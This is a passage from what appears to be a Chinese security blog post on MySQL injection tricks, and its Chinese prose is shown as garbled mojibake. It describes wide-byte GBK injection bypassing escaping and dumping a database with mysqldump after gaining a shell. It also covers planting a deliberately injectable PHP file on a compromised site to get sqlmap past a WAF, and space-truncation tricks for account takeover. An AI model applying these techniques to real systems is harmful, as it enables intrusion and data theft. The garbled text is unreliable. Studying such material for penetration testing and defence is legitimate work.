<p><code>character_set_client</code>: å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ SQL è¯­å¥ç¼–ç ï¼Œä¹Ÿå°±æ˜¯ PHP å‘é€çš„ SQL æŸ¥è¯¢è¯­å¥ç¼–ç å­—ç¬¦é›†ã€‚ä¸€ä¸ª gbk æ±‰å­— 2 å­—èŠ‚ï¼Œutf-8 æ±‰å­— 3 å­—èŠ‚ã€‚</p>
<p>å®½å­—èŠ‚å¯¹è½¬ä¹‰å­—ç¬¦çš„å½±å“å‘ç”Ÿåœ¨ <code>character_set_client=gbk</code> çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå®¢æˆ·ç«¯å‘é€çš„æ•°æ®å­—ç¬¦é›†æ˜¯ gbkï¼Œåˆ™å¯èƒ½ä¼šåƒæ‰è½¬ä¹‰å­—ç¬¦ <code>\</code>ï¼Œä»è€Œå¯¼è‡´è½¬ä¹‰æ¶ˆæ¯’å¤±è´¥ã€‚</p>
<p>å®½å­—èŠ‚æ³¨å…¥æ¼æ´çš„å¦ä¸€ä¸ªå…³é”®æ˜¯è®¾ç½®äº† <code>character_set_client</code> ä¸ºå®½å­—èŠ‚å­—ç¬¦é›†ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šä¸­è®¾ç½®çš„æ–¹å¼ï¼Œä¸»è¦åŒ…æ‹¬éšå¼è®¾ç½®å’Œæ˜¾å¼è®¾ç½®ã€‚</p>
<p>éšå«æ–¹å¼è®¾ç½®æ˜¯æŒ‡ charcter_set_client ç¼ºçœå­—ç¬¦é›†å°±æ˜¯å®½å­—èŠ‚å­—ç¬¦é›†ã€‚</p>
<p>æ˜¾å¼è®¾ç½®æ˜¯æŒ‡åœ¨ PHP ç¨‹åºä¸­è°ƒç”¨ç›¸åº”çš„è®¾ç½®å‡½æ•°æ¥å®ç°å­—ç¬¦é›†çš„è®¾ç½®æˆ–ç›´æ¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œç¼–ç è½¬æ¢ï¼Œè®¾ç½®çš„å‡½æ•°åŒ…æ‹¬ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(<span class="hljs-number">1</span>) mysql_queryï¼Œå¦‚ <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>, <span class="hljs-variable">$conn</span>)ã€<span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;setcharacter_set_client = gbk&quot;</span>, <span class="hljs-variable">$conn</span>)ã€‚<br><br>(<span class="hljs-number">2</span>) mysql_set_charsetï¼Œå¦‚ <span class="hljs-built_in">mysql_set_charset</span>(<span class="hljs-string">&quot;gbk&quot;</span>,<span class="hljs-variable">$conn</span>)ã€‚<br><br>(<span class="hljs-number">3</span>) mb_convert_encodingï¼Œå¦‚ <span class="hljs-built_in">mb_convert_encoding</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-string">&quot;utf8&quot;</span>,<span class="hljs-string">&quot;gbk&quot;</span>)ï¼Œå°† SQL è¯­å¥ä» gbk æ ¼å¼è½¬æ¢ä¸º utf8 æ ¼å¼æ—¶ï¼Œ<span class="hljs-number">0</span>x5c è¢«åƒæ‰äº†ã€‚<br><br>(<span class="hljs-number">4</span>) iconvï¼Œå¦‚ <span class="hljs-built_in">iconv</span>(<span class="hljs-string">&#x27;GBK&#x27;</span>, <span class="hljs-string">&#x27;UTF-8&#x27;</span>,<span class="hljs-variable">$sql</span>)ï¼ŒåŸç†åŒä¸Šã€‚<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/31537.html">è¯¦ç»†ä¸€ç‚¹çš„ä¼ é€é—¨ğŸšª</a></p>
<h2 id="å¿«é€Ÿè„±åº“">å¿«é€Ÿè„±åº“</h2>
<p>åœ¨æ¸—é€æµ‹è¯•çš„æ—¶å€™å‘ç°çš„:<br />
é¦–å…ˆæ»¡è¶³:</p>
<ol type="1">
<li>æœ‰æ•°æ®åº“è´¦å·å¯†ç (ä¸ä¸€å®šæ˜¯ root)</li>
<li><code>mysqldump</code> å¯ä»¥ä½¿ç”¨</li>
<li>get shell</li>
</ol>
<p>æˆ‘é‡åˆ°çš„æƒ…å†µæ˜¯éƒ¨ç½²åœ¨é˜¿é‡Œäº‘ä¸Šçš„æ•°æ®åº“, é™åˆ¶äº†ç™»å½•çš„ ip. ç”¨ sqlmap æ‹–å‡ºæ¥çš„åº“è¡¨æ˜¯ä¹±çš„. è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨ <code>mysqldump</code> å…ˆæŠŠæ•°æ®æ‹–åˆ°æœåŠ¡å™¨ä¸Š, å†ä¸‹è½½åˆ°æœ¬åœ°:</p>
<p><code>mysqldump -ubackup -p123456 -h 192.168.1.2 backup_test &gt; /tmp/bakcup.sql</code></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-u æ˜¯æ•°æ®åº“çš„ç”¨æˆ·åï¼Œåé¢ç´§è·Ÿç€ç”¨æˆ·å backupï¼›</span><br><span class="hljs-deletion">-p æ˜¯æ•°æ®åº“çš„å¯†ç ï¼Œåé¢åŒæ ·ç´§è·Ÿç€å¯†ç ï¼Œæ³¨æ„æ˜¯-p å’Œå¯†ç ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼›</span><br><span class="hljs-deletion">-h æ˜¯æ•°æ®åº“çš„åœ°å€ï¼Œå¦‚æœæ²¡æœ‰æ­¤é¡¹è¡¨æ˜æ˜¯å¤‡ä»½æœ¬åœ°çš„æ•°æ®åº“ï¼›</span><br><br>backup_test è¦å¤‡ä»½çš„æ•°æ®åº“åç§°ï¼›<br></code></pre></td></tr></table></figure>
<p>ç„¶åå¯¼å…¥æœ¬åœ°å³å¯. ä¸è¿‡æˆ‘å‘ç°å¯¼å…¥çš„æ—¶å€™ä½¿ç”¨ <code>mysqldump</code> æœ‰æ—¶å€™ä¼šæœ‰é—®é¢˜, ç”¨ <code>source</code> å‘½ä»¤å¯¼å…¥å°±ä¸ä¼šï¼ŒåŸå› æœªçŸ¥ã€‚</p>
<h2 id="åˆ¶é€ æ³¨å…¥ç‚¹">åˆ¶é€ æ³¨å…¥ç‚¹</h2>
<p>åœ¨æ¸—é€æŸç½‘ç«™çš„æ—¶å€™, æœ‰ç‹—, å·²ç» getshell, ä½†æ˜¯æ­¤ç‹—åœ¨ get å‚æ•°é•¿åº¦å¾ˆé•¿çš„æ—¶å€™ä¼šæ‹¦æˆª, æ‰€ä»¥ sqlmap ç»å¸¸çˆ†æ‰...é‚£ä¹ˆæˆ‘ä»¬å®Œå…¨å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªå«æœ‰ sql æ³¨å…¥çš„ php, è®© sqlmap è·‘è¿™ä¸ª. é‚£ä¹ˆç‹—æ€ä¹ˆåŠå‘¢? æ‹¦æˆª get å‚æ•°, post å‚æ•°æ‹¦ä¸æ‹¦å‘¢? post æ‹¦äº†, ua æ‹¦ä¸æ‹¦å‘¢? cookie å‘¢? å…¶ä»– header å‘¢?<br />
æ€è·¯æœ‰ç‰¹åˆ«å¤š. éšä¾¿è¯´ä¸€å¥, è‡ªå·±æ„é€ çš„ php è¿˜å¯ä»¥å¼„ä¸ª base64 è§£ç , sqlmap ç¼–ç åä¼ è¿‡å», è¿™æ · payload é‡Œæ ¹æœ¬ä¸ä¼šæ²¡æœ‰æ•æ„Ÿçš„å­—ç¬¦, tamper éƒ½çœäº† :P</p>
<h2 id="insert-ä¸-select-å¯¹å¾…ç©ºæ ¼çš„ä¸ä¸€è‡´è¡Œä¸º">insert ä¸ select å¯¹å¾…ç©ºæ ¼çš„ä¸ä¸€è‡´è¡Œä¸º</h2>
<p>mysql ç‰ˆæœ¬éœ€è¦ &lt;<code>mysq 5.7</code></p>
<p>fb ä¸Šçš„ä¸€ç¯‡<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/124537.html">æ–‡ç« </a></p>
<p>ä¸»æ—¨æ€æƒ³æ˜¯åˆ©ç”¨æ•°æ®åº“å¯¹ç©ºæ ¼ç¬¦çš„ç‰¹æ®Šå¤„ç†æ–¹å¼æ¥è¾¾åˆ°æ°´å¹³è¶Šæƒ(ç”šè‡³å‚ç›´è¶Šæƒ)çš„ç›®çš„ã€‚</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;Dumb&#x27;</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;Dumb    &#x27;</span><br></code></pre></td></tr></table></figure>
<p>æŸ¥è¯¢ç»“æœæ˜¯ä¸€è‡´çš„</p>
<p><strong>INSERT æˆªæ–­</strong>ï¼šè¿™æ˜¯æ•°æ®åº“çš„å¦ä¸€ä¸ªç‰¹æ€§ï¼Œå½“è®¾è®¡ä¸€ä¸ªå­—æ®µæ—¶ï¼Œæˆ‘ä»¬éƒ½å¿…é¡»å¯¹å…¶è®¾å®šä¸€ä¸ªæœ€å¤§é•¿åº¦ï¼Œæ¯”å¦‚ CHAR(10)ï¼ŒVARCHAR(20)ç­‰ç­‰ã€‚ä½†æ˜¯å½“å®é™…æ’å…¥æ•°æ®çš„é•¿åº¦è¶…è¿‡é™åˆ¶æ—¶ï¼Œæ•°æ®åº“å°±ä¼šå°†å…¶è¿›è¡Œæˆªæ–­ï¼Œåªä¿ç•™é™å®šçš„é•¿åº¦ã€‚<br />
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;vampire&#x27;</span>, <span class="hljs-string">&#x27;random_pass&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;vampire                   1&#x27;</span>, <span class="hljs-string">&#x27;random_pass&#x27;</span>);<br></code></pre></td></tr></table></figure></p>
<p>æˆªæ–­å(è¿™é‡Œæ˜¯ varchar(10)), åœ¨ select çœ‹æ¥, æ•°æ®åº“é‡Œå°±ç”¨ 2 ä¸ªå« <code>vampire</code> çš„äºº.</p>
<p><strong>åˆ©ç”¨åœºæ™¯</strong><br />
è¿™é‡Œçš„åˆ©ç”¨åœºæ™¯ç­‰åŒäº: å¦‚æœæˆ‘ä»¬ç»•è¿‡äº†ç½‘ç«™é™åˆ¶æ³¨å†ŒåŒä¸€ç”¨æˆ·åçš„é€»è¾‘, ä¼šæœ‰ä»€ä¹ˆå±å®³?</p>
<p>ç›®å‰æˆ‘èƒ½æƒ³åˆ°çš„åªæœ‰ 2 ç§:</p>
<ol type="1">
<li><code>update</code> çš„æ“ä½œæ²¡ç”¨ and æŠŠ passwd åŠ è¿›æ¥, åªéªŒè¯ç”¨æˆ·å, å¯¼è‡´æ›´æ–°ä»»æ„ç”¨æˆ·çš„èµ„æ–™(å‰ææ˜¯çŸ¥é“è¯¥ç”¨æˆ·çš„ç”¨æˆ·å).</li>
<li>ç™»å½•æ—¶è™½ç„¶åŒæ—¶éªŒè¯äº†ç”¨æˆ·åå’Œå¯†ç , ä½†æ˜¯éªŒè¯ååªç”¨ç”¨æˆ·åä½œä¸ºå”¯ä¸€çš„åˆæ³•æ€§æ ‡è¯†ç¬¦(ä¸šåŠ¡é€»è¾‘ä»¥è¯¥ç”¨æˆ·åä¸ºå‡†). æ¯”å¦‚å†™æ­»äº† admin è¿™ä¸ªåå­—çš„ç”¨æˆ·å¯ä»¥å¢åŠ ç®¡ç†å‘˜ç­‰ç­‰. ä¸è¿‡è¿”å›çš„æ•°æ®ä»ç„¶æ˜¯å¸¦ç©ºæ ¼çš„ <code>vampire</code>, ä¸ä¸€å®šèƒ½é€šè¿‡ <code>==</code> çš„æ£€æŸ¥, å¾—å…·ä½“çœ‹ä»£ç æ€ä¹ˆå¤„ç†.<br />
<br>
<p style="text-align: center;">
<font size="2px" color="gray">æ¥å‘€å¿«æ´»å‘€</font><br />
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
</p></li>
</ol>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">ç»éªŒæ€»ç»“</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/">#Web</a>
      
        <a href="/tags/%E6%B3%A8%E5%85%A5/">#æ³¨å…¥</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>MySQL æ³¨å…¥æŠ€å·§</div>
      <div>https://www.tr0y.wang/2018/04/07/MySQLæ³¨å…¥æŠ€å·§/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Tr0y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2018å¹´4æœˆ7æ—¥</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>æ›´æ–°äº</div>
          <div>2023å¹´12æœˆ13æ—¥</div>
        </div>
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2018/04/08/PHPFunc/" title="PHP è®°å½•">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">PHP è®°å½•</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/" title="SQL æ³¨å…¥å…³è”åˆ†æ">
                        <span class="hidden-mobile">SQL æ³¨å…¥å…³è”åˆ†æ</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('label', 'comment');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
